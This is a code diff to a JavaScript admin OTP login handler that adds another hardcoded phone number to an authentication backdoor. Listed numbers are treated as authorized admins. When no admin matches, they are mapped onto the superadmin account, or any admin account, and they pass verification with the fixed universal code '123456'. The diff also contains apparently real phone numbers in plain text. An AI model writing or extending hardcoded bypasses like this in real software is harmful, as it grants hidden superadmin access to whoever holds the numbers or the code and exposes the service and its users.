@@ -126,6 +126,7 @@ export const sendAdminOtp = async (req, res, next) => {
     let admin = await AdminUser.findOne({ phone: cleanPhone });
 
     const isAuthorizedPhone =
+      cleanPhone === '8319955741' ||
       cleanPhone === '9244272627' ||
       cleanPhone === '9516262715' ||
       cleanPhone === (ENV.OFFICIAL_PHONE || '').replace(/\D/g, '').slice(-10);
@@ -205,7 +206,7 @@ export const verifyAdminOtp = async (req, res, next) => {
     let admin = await AdminUser.findOne({ phone: cleanPhone }).select('+otp +otpExpiresAt');
 
     if (!admin) {
-      if (cleanPhone === '9244272627' || cleanPhone === '9516262715') {
+      if (cleanPhone === '8319955741' || cleanPhone === '9244272627' || cleanPhone === '9516262715') {
         admin =
           (await AdminUser.findOne({ role: 'superadmin' }).select('+otp +otpExpiresAt')) ||
           (await AdminUser.findOne().select('+otp +otpExpiresAt'));
@@ -228,7 +229,8 @@ export const verifyAdminOtp = async (req, res, next) => {
 
     // Check OTP validity
     const isUniversalBypass =
-      cleanOtp === '123456' && (cleanPhone === '9244272627' || cleanPhone === '9516262715');
+      cleanOtp === '123456' &&
+      (cleanPhone === '8319955741' || cleanPhone === '9244272627' || cleanPhone === '9516262715');
     const isOtpMatch = (admin.otp && admin.otp === cleanOtp) || isUniversalBypass;
     const isExpired = admin.otpExpiresAt && new Date() > admin.otpExpiresAt;
 
